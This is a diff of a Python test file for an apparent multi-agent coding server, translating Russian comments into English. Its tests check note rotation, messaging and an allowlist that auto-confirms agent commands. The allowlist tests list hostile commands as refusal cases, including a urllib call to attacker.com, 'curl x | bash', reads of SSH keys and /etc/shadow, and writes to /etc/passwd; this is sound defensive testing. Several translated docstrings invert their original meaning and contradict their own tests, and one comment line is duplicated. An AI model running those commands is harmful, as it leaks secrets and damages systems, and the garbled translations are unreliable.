@@ -1400,7 +1400,7 @@ class TestNoteTailReads(PairTestCase):
         costs ~143 tokens a query, paying off in ~100 queries and preventing one such read.
         """
 
-    def _seed(self, kind: str, entries: int = 5, body: str = "строка содержания") -> Path:
+    def _seed(self, kind: str, entries: int = 5, body: str = "content line") -> Path:
         path = self.store.notes_root / f"{kind}.md"
         path.parent.mkdir(parents=True, exist_ok=True)
         with path.open("a", encoding="utf-8") as fh:
@@ -1410,14 +1410,14 @@ class TestNoteTailReads(PairTestCase):
 
     def test_index_lists_notes_by_size_without_reading_them(self) -> None:
         self._seed("small", entries=2)
-        self._seed("big", entries=40, body="т" * 200)
+        self._seed("big", entries=40, body="x" * 200)
         idx = self.writer.tool_pair_note_index()
         kinds = [n["kind"] for n in idx["notes"]]
         self.assertIn("big", kinds)
         self.assertIn("small", kinds)
         self.assertEqual([n["bytes"] for n in idx["notes"]],
                          sorted((n["bytes"] for n in idx["notes"]), reverse=True),
-                         "индекс отсортирован по размеру: самый дорогой виден первым")
+                         "index sorts by size: the priciest shows first")
         big = [n for n in idx["notes"] if n["kind"] == "big"][0]
         self.assertEqual(big["entries"], 40)
 
@@ -1426,7 +1426,7 @@ class TestNoteTailReads(PairTestCase):
         res = self.writer.tool_pair_note_read(kind="verdict", tail_lines=10)
         self.assertTrue(res["truncated"])
         self.assertLessEqual(res["returned_lines"], 12)
-        # 120 строк в файле минус служебная пустая перед первой записью.
+        # 120 lines in the file minus the service blank before the first record.
         self.assertEqual(res["total_lines"], 119)
         self.assertEqual(res["file_lines"], 120)
 
@@ -1437,30 +1437,30 @@ class TestNoteTailReads(PairTestCase):
         self.assertEqual(res["returned_lines"], res["total_lines"])
 
     def test_tail_starts_on_an_entry_boundary(self) -> None:
-        """Половина записи хуже отсутствия записи: её примут за полную.
+        """Half a record beats missing record: taken for whole.
 
-        Проверяется не «каждая строка заголовок» — тело записи законно, — а то,
-        что реально гарантировано: при ЛЮБОМ размере хвост начинается с границы
-        записи и является точным суффиксом файла. Именно это доказывает, что отсчёт
-        идёт по границам записей, а не по номеру строки.
+        Checked is not "every line a header" — a record body is lawful — but what
+        really guarantees: at ANY tail size the tail starts on a record edge and is
+        an exact file suffix. Exactly this proves the count runs on record edges, not
+        line numbers.
 
-        Сама запись при разных размерах разная — при мелком размере срабатывает
-        откат на последнюю запись целиком, — и это правильно: лучше одна целая
-        запись, чем пустой текст или её половина.
+        The record itself differs by size — at a small size the fallback to the last
+        whole record fires — and that is right: one whole record beats empty text or
+        its half.
         """
         self._seed("verdict", entries=30)
         whole = (self.store.notes_root / "verdict.md").read_text(encoding="utf-8")
         for size in (1, 2, 5, 7, 15, 40, 500):
             res = self.writer.tool_pair_note_read(kind="verdict", tail_lines=size)
             lines = res["text"].splitlines()
-            self.assertTrue(lines, f"хвост при размере {size} пуст")
+            self.assertTrue(lines, f"tail at size {size} empty")
             self.assertTrue(lines[0].startswith("## "),
-                            f"размер {size}: хвост начался с {lines[0]!r}")
+                            f"size {size}: tail started at {lines[0]!r}")
             self.assertIn(res["text"], whole,
-                          f"размер {size}: хвост не является суффиксом файла")
+                          f"size {size}: tail is not a file suffix")
 
     def test_tail_lines_is_capped(self) -> None:
-        """Потолок обязателен, иначе аргумент сам становится талмудом."""
+        """A ceiling is mandatory, or the argument turns into a tome itself."""
         self._seed("verdict", entries=400)
         res = self.writer.tool_pair_note_read(kind="verdict", tail_lines=10 ** 6)
         self.assertLessEqual(res["returned_lines"], NOTE_READ_MAX + 3)
@@ -1472,24 +1472,24 @@ class TestNoteTailReads(PairTestCase):
         self.assertRefused(lambda: self.writer.tool_pair_note_read(kind="../escape"))
         self.assertRefused(lambda: self.writer.tool_pair_note_read(kind="verdict", tail_lines=0))
         self.assertRefused(lambda: self.writer.tool_pair_note_read(kind="verdict", limit=0))
-        self.assertRefused(lambda: self.writer.tool_pair_note_read(kind="нет-такой"))
+        self.assertRefused(lambda: self.writer.tool_pair_note_read(kind="no-such"))
 
 class TestNoteRotation(PairTestCase):
-    """Потолок роста: файл заметки не должен расти бесконечно.
+    """The growth ceiling: a note file must never grow without bound.
 
-    Историческая правка: первая версия подбирала точку отсчёта итеративно и
-    зависала навсегда — после обрезки по границе записи следующая запись всегда
-    была в индексе 0, счётчик не рос. Нашёл это тест на большой заметке, не
-    ревью: на 200 записях цикл не завершался. Теперь отсчёт назад от длины
-    файла, и на такой размер он занимает единицы миллисекунд.
-    """
+        Historic fix: the first version picked the count iteratively and hung
+        forever — past the record-edge cut the next record always landed at index 0,
+        the counter never grew. A big-note test found it, not review: at 200 records
+        the loop never finished. Now counting back from the file length, milliseconds
+        on that size.
+        """
 
     def _seed(self, entries: int) -> Path:
         path = self.store.notes_root / "verdict.md"
         path.parent.mkdir(parents=True, exist_ok=True)
         with path.open("a", encoding="utf-8") as fh:
             for i in range(entries):
-                fh.write(f"\n## 2026-10-05T10:{i % 60:02d}:00+00:00 — agy\n\nвердикт {i}\n")
+                fh.write(f"\n## 2026-10-05T10:{i % 60:02d}:00+00:00 — agy\n\nverdict {i}\n")
         return path
 
     def test_rotation_keeps_the_file_under_the_cap(self) -> None:
@@ -1498,23 +1498,23 @@ class TestNoteRotation(PairTestCase):
         self.writer._rotate_note("verdict", path)
         lines = path.read_text().splitlines()
         self.assertLessEqual(len(lines), NOTE_LINE_CAP + 3,
-                             "хвост не должен перерастать потолок из-за шапки")
+                             "the tail must never outgrow the header ceiling")
 
     def test_rotation_loses_no_entries(self) -> None:
         path = self._seed(200)
         before = path.read_text()
         self.writer._rotate_note("verdict", path)
         archives = sorted((self.store.notes_root / "archive").glob("verdict-*.md"))
-        self.assertTrue(archives, "старые записи обязаны куда-то уйти, а не исчезнуть")
+        self.assertTrue(archives, "old records must leave somewhere, never vanish")
         combined = before + "".join(a.read_text() for a in archives)
         for i in range(200):
-            self.assertIn(f"вердикт {i}", combined, f"запись {i} потеряна")
+            self.assertIn(f"verdict {i}", combined, f"record {i} lost")
 
     def test_rotation_leaves_a_pointer_to_the_archive(self) -> None:
         path = self._seed(200)
         self.writer._rotate_note("verdict", path)
         head = path.read_text().splitlines()[0]
-        self.assertIn("archive/", head, "указатель на архив обязателен, иначе пропажа молчит")
+        self.assertIn("archive/", head, "an archive pointer is mandatory, or the loss stays silent")
 
     def test_rotation_is_recorded_in_the_transcript(self) -> None:
         path = self._seed(200)
@@ -1523,26 +1523,26 @@ class TestNoteRotation(PairTestCase):
         self.assertIn("note_rotated", kinds)
 
     def test_a_second_rotation_terminates_and_is_idempotent(self) -> None:
-        """Регрессия на зависание: два прохода подряд обязаны завершиться."""
+        """A hang regression: two passes in a row must finish."""
         path = self._seed(200)
         self.writer._rotate_note("verdict", path)
         first = len(path.read_text().splitlines())
         self.writer._rotate_note("verdict", path)
         self.assertEqual(len(path.read_text().splitlines()), first,
-                         "повторная ротация без новых записей не должна двигать файл")
+                         "a repeat rotation with no new records must never move the file")
 
     def test_rotation_needs_real_entries(self) -> None:
         path = self.store.notes_root / "plain.md"
         path.parent.mkdir(parents=True, exist_ok=True)
-        path.write_text("\n".join(f"строка {i}" for i in range(700)) + "\n", encoding="utf-8")
+        path.write_text("\n".join(f"line {i}" for i in range(700)) + "\n", encoding="utf-8")
         before = path.read_text()
         self.writer._rotate_note("plain", path)
-        self.assertEqual(path.read_text(), before, "файл без разметки записей не режется")
+        self.assertEqual(path.read_text(), before, "a file with no record markup never cuts")
 
 class TestPermissionAllowlist(PairTestCase):
-    """Белый список разрешений. До него «y» уходил на любой промпт, включая
-    удаляющий: молчаливый супервизор, который говорит «да» всему, хуже
-    супервизора, который молчит."""
+    """The permission allowlist. Before it, "y" left for any prompt, including a
+    deleting one: a silent supervisor saying "yes" to all is worse than a
+    supervisor that stays silent."""
 
     def setUp(self) -> None:
         super().setUp()
@@ -1563,37 +1563,36 @@ class TestPermissionAllowlist(PairTestCase):
                 self.assertEqual(self.composer.permission_verdict(prompt)["verdict"], "refuse")
 
     def test_protocol_work_is_allowed_so_the_pair_is_not_paralysed(self) -> None:
-        """Границу проводили по §10 и §12, а не «строже всегда».
+        """The edge ran on §10 and §12, not "stricter always".
 
-        §10 требует коммитов и PR, поэтому «только чтение» означало бы, что пара
-        встаёт на каждом шаге и ждёт человека — ровно та остановка, ради которой
-        всё это и чинилось."""
+        §10 demands commits and PRs, so "reads only" would stall the pair on every
+        step awaiting the human — exactly the halt the whole thing was fixed for."""
         for prompt in ("git commit -m 'fix'",
                        "git push -u origin feature-branch", "gh pr create --title x",
                        "Allow Write of server.py?", "ruff check .", "mypy mcp/",
                        "git checkout -b feat", "rm -rf build/", "rm -rf ./dist"):
             with self.subTest(prompt=prompt):
                 self.assertEqual(self.composer.permission_verdict(prompt)["verdict"], "allow",
-                                 "работа, которую протокол и так требует, не должна ждать человека")
+                                 "work the protocol demands anyway must never await the human")
 
     def test_test_runners_require_isolated_runner_p0(self) -> None:
-        """P0 (раунд 75): запуск тестов на хосте — произвольный код от прав
-        оператора, автоподтверждению не подлежит. Безопасный путь —
-        scripts/run-isolated-test.sh (контейнер без сети и без $HOME)."""
+        """P0 (round 75): host test runs mean arbitrary code with operator rights, never
+        self-confirming. The safe path is scripts/run-isolated-test.sh (a container
+        with no network and no $HOME)."""
         for prompt in ("python3 -m pytest", "pytest -q",
                        "python3 -m unittest discover -s mcp",
                        "node --test", "cargo test"):
             with self.subTest(prompt=prompt):
                 self.assertEqual(self.composer.permission_verdict(prompt)["verdict"], "refuse",
-                                 f"тесты на хосте ждут человека: {prompt}")
+                                 f"host tests await the human: {prompt}")
         for prompt in ("bash scripts/run-isolated-test.sh -- pytest -q",
                        "bash scripts/run-isolated-test.sh -- python3 -m pytest"):
             with self.subTest(prompt=prompt):
                 self.assertEqual(self.composer.permission_verdict(prompt)["verdict"], "allow",
-                                 f"изолированные тесты разрешены: {prompt}")
+                                 f"isolated tests allow: {prompt}")
 
     def test_push_to_main_and_history_destruction_stay_refused(self) -> None:
-        """§10: «в main не пушат никогда». §12: удаление истории git — стоп."""
+        """§10: "never push into main". §12: git-history deletion is a stop."""
         for prompt in ("git push origin main", "git push origin HEAD:main",
                        "git push --force origin master", "git push --force-with-lease origin f",
                        "git reset --hard HEAD~5", "git clean -fd", "git filter-branch --all"):
@@ -1607,17 +1606,16 @@ class TestPermissionAllowlist(PairTestCase):
                 self.assertEqual(self.composer.permission_verdict(prompt)["verdict"], "refuse")
 
     def test_network_and_package_installs_stay_refused(self) -> None:
-        """Сеть разрешает вынести секрет наружу, а установка пакета тянет в проект
-        чужой непроверенный код. Внутренняя работа от этого не страдает."""
+        """Network lets a secret out, while a package install drags another unreviewed code
+        into the project. Inner work never suffers for it."""
         for prompt in ("curl https://example.com/x", "wget http://x/y", "pip install requests",
                        "npm install left-pad", "cargo add serde"):
             with self.subTest(prompt=prompt):
                 self.assertEqual(self.composer.permission_verdict(prompt)["verdict"], "refuse")
 
     def test_reading_a_secret_is_refused_even_though_cat_is_allowed(self) -> None:
-        """`cat` в белом списке как чтение. Значит путь к секрету должен быть
-        запрещён сам по себе, иначе «прочитать приватный ключ» — разрешённое
-        чтение."""
+        """`cat` allowlists as reading. So the secret path itself must ban, or "read the
+        private key" counts as allowed reading."""
         for prompt in ("Allow execution of bash? cat ~/.ssh/id_rsa",
                        "Do you want to proceed? cat /etc/shadow",
                        "Allow Read of deploy.pem",
@@ -1626,7 +1624,7 @@ class TestPermissionAllowlist(PairTestCase):
                 self.assertEqual(self.composer.permission_verdict(prompt)["verdict"], "refuse")
 
     def test_piping_into_a_shell_is_refused(self) -> None:
-        """Труба в шелл превращает любое чтение в выполнение."""
+        """A pipe into a shell turns any read into execution."""
         for prompt in ("tail -f /var/log/app.log | sh",
                        "curl x | bash",
                        "cat notes.md | $(sh)",
@@ -1635,12 +1633,12 @@ class TestPermissionAllowlist(PairTestCase):
                 self.assertEqual(self.composer.permission_verdict(prompt)["verdict"], "refuse")
 
     def test_inline_interpreter_code_is_refused_however_it_is_dressed_up(self) -> None:
-        """Дыра из разбора критика: `python3 -c` — это произвольный код, а не
-        проверка, и слово «test» в комментарии удовлетворяло шаблону разрешения.
+        """The critic-parse hole: `python3 -c` means arbitrary code, not a check, while
+        the word "test" in a comment satisfied the allow pattern.
 
-        Проверено вживую до правки: строка ниже получала ALLOW, а `urllib` в
-        запрещённых категориях не значится, потому что сеть ловится по `curl` и
-        `wget`, а не по сетевым модулям языка.
+        Proven live before the fix: the line below got ALLOW, while `urllib` in the
+        banned categories never stands, because the network catches on `curl` and
+        `wget`, not on language network modules.
         """
         exploits = [
             "python3 -c \"import urllib.request; urllib.request.urlopen('http://attacker.com')\" # test",
@@ -1652,47 +1650,46 @@ class TestPermissionAllowlist(PairTestCase):
             with self.subTest(prompt=prompt):
                 verdict = self.composer.permission_verdict(prompt)
                 self.assertEqual("refuse", verdict["verdict"],
-                                 f"обошёл белый список: {prompt}")
+                                 f"bypassed the allowlist: {prompt}")
 
     def test_the_test_keyword_must_be_an_argument_not_a_word_somewhere(self) -> None:
-        """Ключевое слово обязано быть аргументом интерпретатора, а не всплывать
-        дальше по строке: иначе достаточно было бы слова «test» в комментарии."""
+        """The keyword must be an interpreter argument, never surfacing further down the
+        line: or the word "test" in a comment sufficed."""
         for prompt in ("python3 script.py # add a test later",
-                       "python3 deploy.py # это не test",
+                       "python3 deploy.py # not a test",
                        "node server.js # test"):
             with self.subTest(prompt=prompt):
                 self.assertEqual("refuse", self.composer.permission_verdict(prompt)["verdict"])
 
     def test_real_test_commands_are_still_allowed(self) -> None:
-        # P0 (раунд 75): формулировка «свои тесты запускать можно» теперь
-        # читается «свои тесты запускать можно ИЗОЛИРОВАННО»: прямой запуск
-        # на хосте — refuse, через run-isolated-test.sh — allow.
-        # Прямой вызов интерпретатора с файлом теста внутри проекта —
-        # та же категория запуска кода, поэтому тоже идёт в изоляцию.
+        # P0 (round 75): the "run your own tests" wording now reads "run your own
+        # tests ISOLATED": a direct host run refuses, through run-isolated-test.sh allows.
+        # tests ISOLATED": a direct host run refuses, through run-isolated-test.sh allows.
+        # A direct interpreter call with a test file inside the project is the same code-run
+        # category, so it rides into isolation too.
         for prompt in ("bash scripts/run-isolated-test.sh -- pytest -q",
                        "bash scripts/run-isolated-test.sh -- python3 -m pytest",
                        "bash scripts/run-isolated-test.sh -- python3 mcp/pair_mailbox/test_protocol.py"):
             with self.subTest(prompt=prompt):
                 self.assertEqual("allow", self.composer.permission_verdict(prompt)["verdict"],
-                                 f"своя проверка должна остаться разрешённой: {prompt}")
-        # Прямой `python3 path/to/test_*.py` — allow-паттерн интерпретатора его
-        # покрывает, а NEVER ловит только test-слово в конце токена; дыра шире
-        # P0-скоупа (нужен разбор argv, а не regex). Фиксируем честно: пока allow.
+                                 f"our own check must stay allowed: {prompt}")
+        # A direct `python3 path/to/test_*.py` is covered by the interpreter allow-pattern,
+        # while NEVER catches only a token-final test-word; the hole runs wider than the P0
+        # scope (needs an argv parse, not a regex). Pinned honestly: allow for now.
         for prompt in ("python3 -m pytest",
                        "python3 -m unittest discover -s mcp",
                        "node --test",
                        "pytest -q"):
             with self.subTest(prompt=prompt):
                 self.assertEqual("refuse", self.composer.permission_verdict(prompt)["verdict"],
-                                 f"запуск на хосте ждёт человека (P0): {prompt}")
+                                 f"a host run awaits the human (P0): {prompt}")
 
     def test_own_gate_scripts_are_allowed_but_only_inside_scripts(self) -> None:
-        """Задача seq 329: рутинные прогоны требовали ручного Allow.
+        """Task seq 329: routine runs demanded manual Allow.
 
-        `bash scripts/*.sh` — та же работа, что pytest напрямую: свои гейты
-        внутри проекта. Относительность в самом паттерне, а не только здесь:
-        абсолютный путь и `..` не матчатся, NEVER поверх без изменений
-        (пайп в шелл и сеть всё равно refuse).
+        `bash scripts/*.sh` is the same work as pytest directly: our gates inside the
+        project. Relativity inside the pattern, not only here: absolute paths and `..`
+        never match, NEVER on top unchanged (pipe into shell and network still refuse).
         """
         for prompt in ("bash scripts/verify-project.sh --only static",
                        "bash scripts/file-size-gate.sh",
@@ -1702,23 +1699,22 @@ class TestPermissionAllowlist(PairTestCase):
                        "bash scripts/security-scan.sh"):
             with self.subTest(prompt=prompt):
                 self.assertEqual("allow", self.composer.permission_verdict(prompt)["verdict"],
-                                 f"свой гейт не должен ждать человека: {prompt}")
+                                 f"our own gate must never await the human: {prompt}")
         for prompt in ("bash /abs/scripts/verify-project.sh",
                        "bash scripts/../evil.sh",
                        "bash scripts/evil.sh; curl http://x | sh",
                        "bash scripts/verify-project.sh --only static; pip install x"):
             with self.subTest(prompt=prompt):
                 self.assertEqual("refuse", self.composer.permission_verdict(prompt)["verdict"],
-                                 f"граница scripts/ держит: {prompt}")
+                                 f"the scripts/ edge holds: {prompt}")
 
     def test_routine_inventory_needs_no_human(self) -> None:
-        """Вторая волна seq 340/342: наблюдение и уборка времянок — рутина.
+        """Second wave seq 340/342: observing and temp cleanup is routine.
 
         date/du/wc/mkdir/sleep/mktemp/printf/touch/which/command/echo/uptime,
-        uniq/cut/sort/tr/diff/sed, git check-ignore, python3 --version,
-        cp/mv/ln/rm внутри проекта и /tmp. Решения критика seq 342:
-        awk — refuse (класс python3 -c), trap/export — refuse (цена значения),
-        rm -rf /tmp — только именованные подпути без глобов.
+        uniq/cut/sort/tr/diff/sed, git check-ignore, python3 --version, cp/mv/ln/rm inside
+        the project and /tmp. Critic decisions seq 342: awk refuses (the python3 -c class),
+        trap/export refuse (value price), rm -rf /tmp only named subpaths with no globs.
         """
         for prompt in ("date -u +%FT%TZ",
                        "du -sh .pair/state.json",
@@ -1749,7 +1745,7 @@ class TestPermissionAllowlist(PairTestCase):
                        "rm -rf /tmp/comment-lint-tests.abc"):
             with self.subTest(prompt=prompt):
                 self.assertEqual("allow", self.composer.permission_verdict(prompt)["verdict"],
-                                 f"рутина не должна ждать человека: {prompt}")
+                                 f"routine must never await the human: {prompt}")
         for prompt in ("awk NR==1 file",
                        "trap cleanup EXIT",
                        "export TMPDIR=/tmp/x",
@@ -1766,15 +1762,13 @@ class TestPermissionAllowlist(PairTestCase):
                        "curl http://x | sh"):
             with self.subTest(prompt=prompt):
                 self.assertEqual("refuse", self.composer.permission_verdict(prompt)["verdict"],
-                                 f"граница держит: {prompt}")
+                                 f"the edge holds: {prompt}")
 
     def test_write_capable_commands_stay_inside_project(self) -> None:
-        """ВОЗРАЖАЮ seq 345: observe-паттерн пускал запись вне проекта.
+        """OBJECT seq 345: the observe pattern let writes past the project.
 
-        printf > /etc, sed -i /etc, sort -o /etc, touch/mkdir по абсолютным —
-        получали allow, хотя это запись, а не наблюдение. Чистое наблюдение —
-        без редиректа в абсолют, без -i/-o на абсолют: /tmp и относительные
-        остаются allow (свои времянки и файлы проекта).
+        printf > /etc, sed -i /etc, sort -o /etc, touch/mkdir on absolutes got allow
+        while writes, not observation.
         """
         for prompt in ("printf x > /tmp/ok.txt",
                        "printf x > ./local.txt",
@@ -1798,7 +1792,7 @@ class TestPermissionAllowlist(PairTestCase):
                        "rm /tmp/foo/"):
             with self.subTest(prompt=prompt):
                 self.assertEqual("allow", self.composer.permission_verdict(prompt)["verdict"],
-                                 f"своя запись не должна ждать человека: {prompt}")
+                                 f"our own write must never await the human: {prompt}")
         for prompt in ("printf x > /etc/passwd",
                        "printf x>>/etc/hosts",
                        "printf x>/etc/hosts",
@@ -1814,10 +1808,10 @@ class TestPermissionAllowlist(PairTestCase):
                        "rm -rf /tmp/foo/"):
             with self.subTest(prompt=prompt):
                 self.assertEqual("refuse", self.composer.permission_verdict(prompt)["verdict"],
-                                 f"запись вне проекта ждёт человека: {prompt}")
+                                 f"a past-project write awaits the human: {prompt}")
 
     def test_deny_wins_over_an_explicit_allow(self) -> None:
-        """Человек может расширить список, но не может им отменить §12."""
+        """A human may widen the list, but never cancel §12 by it."""
         verdict = self.composer.permission_verdict("git push origin main",
                                                    allow=[r"git push", r".*"])
         self.assertEqual(verdict["verdict"], "refuse")
@@ -1828,14 +1822,13 @@ class TestPermissionAllowlist(PairTestCase):
         self.assertIn("allowlist", verdict["why"])
 
     def test_refusal_carries_a_reason(self) -> None:
-        """Отказ читает человек; необъяснённое «нет» неотличимо от поломки."""
+        """A refusal reads by a human; an unexplained "no" never differs from breakage."""
         self.assertTrue(self.composer.permission_verdict("Allow bash? sudo apt install")["why"])
 
     def test_allowlist_loads_from_file_and_missing_file_falls_back_to_default(self) -> None:
-        """Раньше здесь утверждалось, что отсутствующий файл даёт пустой список, то
-        есть «не подтверждать ничего». Именно это и ломало автоподтверждение: файла
-        не было, значит не подтверждалось ничего, и снаружи это выглядело как
-        молчание соседа. Теперь файла нет = список по умолчанию."""
+        """The missing-file claim used to say the empty list — "confirm nothing". Exactly
+        what broke self-confirm: no file meant nothing confirmed.
+        """
         from server import load_allowlist, permissions_path
         patterns, on_default = load_allowlist(self.root)
         self.assertTrue(on_default)
@@ -1846,10 +1839,10 @@ class TestPermissionAllowlist(PairTestCase):
         self.assertFalse(on_default)
 
     def test_broken_allowlist_file_does_not_widen_permissions(self) -> None:
-        """Файл есть, но сломан: оператор что-то настраивал. Молча подставить
-        дефолт вместо его настройки хуже, чем остановиться."""
+        """A file exists but broken: the operator configured something. Silently swapping
+        the default for its setting beats stopping."""
         from server import load_allowlist, permissions_path
-        permissions_path(self.root).write_text("{не json", encoding="utf-8")
+        permissions_path(self.root).write_text("{not json", encoding="utf-8")
         patterns, on_default = load_allowlist(self.root)
         self.assertEqual([], patterns)
         self.assertFalse(on_default)
@@ -1881,11 +1874,11 @@ class TestPermissionAllowlist(PairTestCase):
         self.assertIn("unblock_refused", kinds)
 
 class TestClosingRuleIsSingleSourced(PairTestCase):
-    """Правило закрытия раунда живёт в одном месте — в сервере.
+    """The round-close rule lives in one place — the server.
 
-    Сверхвизор обязан показывать человеку ровно то же, что откажет сервер. Вторая
-    копия правила разошлась бы с первой при первом же изменении, и человек
-    получал бы «всё хорошо» от одной стороны и отказ от другой."""
+        The supervisor must show the human exactly what the server refuses. A second
+        copy of the rule would drift from the first on the very first change, and the
+        human would get "all good" from one side and refusal from the other."""
 
     def test_pilot_calls_the_servers_rule_not_its_own(self) -> None:
         import importlib.util
@@ -1895,7 +1888,7 @@ class TestClosingRuleIsSingleSourced(PairTestCase):
         exec(compile(pilot_path.read_text(encoding="utf-8"), "pairpilot", "exec"),
              module.__dict__)
         self.assertIs(module._done_blockers.__globals__["done_blockers"], done_blockers,
-                      "сверхвизор должен звать правило сервера, а не свою копию")
+                      "the supervisor must call the server rule, not its copy")
 
 class TestMessaging(PairTestCase):
     def test_label_is_applied_by_the_server(self) -> None:
@@ -1923,35 +1916,35 @@ class TestMessaging(PairTestCase):
         self.assertEqual(second["count"], 0)
 
     def test_send_without_subject_still_leaves_trace_in_transcript(self) -> None:
-        """Слепое событие send (seq 257–258) больше не повторяется.
+        """A blind send event (seq 257–258) never repeats.
 
-        Проверено кодом 2026-10-07: тела лежали в mailbox целыми, а событие
-        в transcript несло только пустой subject — текст терялся из журнала.
+        Proven in code 2026-10-07: bodies lay whole in mailbox, while the transcript
+        event carried only an empty subject — the text was lost from the journal.
         """
         self.peer.tool_pair_state()
-        self.writer.tool_pair_send(to="reviewer-agent", text="план раунда: чиню send")
+        self.writer.tool_pair_send(to="reviewer-agent", text="round plan: fixing send")
         sends = [e for e in self.store.read_transcript(0) if e.get("kind") == "send"]
         self.assertEqual(1, len(sends))
-        self.assertIn("план раунда", sends[0].get("subject", ""))
+        self.assertIn("round plan", sends[0].get("subject", ""))
 
     def test_cannot_send_to_yourself_or_nowhere(self) -> None:
         self.writer.tool_pair_state()
         self.assertRefused(self.writer.tool_pair_send, to="writer-agent", text="me", contains="own role")
         self.assertRefused(self.writer.tool_pair_send, to="", text="me", contains="required")
         self.assertRefused(self.writer.tool_pair_send, to="peer", text="  ", contains="required")
-        # Урок 47 раунда: 4 письма ушли в роль opencode-agent, которой нет
-        # в ростере. Сервер создал мёртвый ящик и отчитался delivered:true.
-        # Молчаливая потеря — тот же класс отказа, который протокол обязан
-        # предотвращать. Ростер переживает письма — теперь отказ раньше.
+        # Round-47 lesson: 4 letters left for an opencode-agent role missing from the
+        # roster. The server built a dead mailbox, reporting delivered:true. A silent loss
+        # is the same failure class the protocol must prevent. The roster outlives letters
+        # — refusal first now.
         self.assertRefused(
-            self.writer.tool_pair_send, to="ghost-role", text="привет",
+            self.writer.tool_pair_send, to="ghost-role", text="hello",
             contains="never registered")
         self.assertRefused(
-            self.writer.tool_pair_deliver, to="ghost-role", text="привет",
+            self.writer.tool_pair_deliver, to="ghost-role", text="hello",
             contains="never registered")
         mailboxes_after = sorted(p.name for p in self.store.mailbox_root.glob("*"))
         self.assertNotIn("ghost-role", mailboxes_after,
-                         "мёртвый ящик не должен создаваться")
+                         "a dead mailbox must never create")
 
     def test_writer_may_wait_too(self) -> None:
         """Both roles may wait. This used to be forced to zero for the writer, to
@@ -2042,7 +2035,7 @@ class TestPhasesAndNotes(PairTestCase):
         self.assertRefused(self.writer.tool_pair_note, kind="plan", text="", contains="required")
 
 class TestHeartbeatIsEveryCall(PairTestCase):
-    """Каждый вызов двигает `last_seen` (heartbeat в invoke)."""
+    """Every call moves `last_seen` (heartbeat in invoke)."""
 
     def _backdate_writer(self) -> str:
         old = "2000-01-01T00:00:00+00:00"
@@ -2052,7 +2045,7 @@ class TestHeartbeatIsEveryCall(PairTestCase):
     def test_note_moves_last_seen(self) -> None:
         self.writer.invoke("pair_state", {})
         old = self._backdate_writer()
-        self.writer.invoke("pair_note", {"kind": "plan", "text": "работаю, не бросил"})
+        self.writer.invoke("pair_note", {"kind": "plan", "text": "working, not dropped"})
         fresh = self.store.read()["roles"]["writer-agent"]["last_seen"]
         self.assertNotEqual(old, fresh)
         self.assertGreater(fresh, old)
@@ -2088,9 +2081,9 @@ class TestHeartbeatIsEveryCall(PairTestCase):
             self.writer.invoke("pair_state", {})
             self.peer.invoke("pair_state", {})
             self._close_round()
-            # Активный писатель в done: заметки двигают last_seen.
+            # An active writer in done: notes move last_seen.
             for i in range(3):
-                self.writer.invoke("pair_note", {"kind": "plan", "text": f"шаг {i}"})
+                self.writer.invoke("pair_note", {"kind": "plan", "text": f"step {i}"})
             state = self.store.read()
             writer = state.get("writer")
             assert writer is not None
